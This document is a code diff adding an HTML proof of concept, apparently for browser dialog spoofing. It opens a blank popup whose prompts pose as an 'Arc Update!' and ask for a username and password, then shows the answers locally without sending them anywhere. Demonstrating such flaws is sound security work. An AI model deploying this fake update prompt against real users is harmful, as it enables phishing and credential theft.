@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Browser Permission Playground</title>
+</head>
+
+<body>
+  <button onclick="openPopup()">Open Permission Popup</button>
+
+  <script>
+    function openPopup() {
+      const w = window.open("about:blank");
+
+      // write HTML into popup
+      w.document.body.innerHTML = `
+        <h2>PoC</h2>
+        <button id="run">Click Me</button>
+        <div id="result"></div>
+      `;
+
+      // attach JS inside popup
+      w.document.getElementById("run").onclick = function () {
+        const username = w.prompt("Arc Update! Please Enter your Username");
+        const password = w.prompt("Please Enter your Password");
+
+        w.document.getElementById("result").innerHTML =
+          "<p><b>Username:</b> " + username + "</p>" +
+          "<p><b>Password:</b> " + password + "</p>";
+      };
+
+      w.focus();
+    }
+  </script>
+
+</body>
+</html>
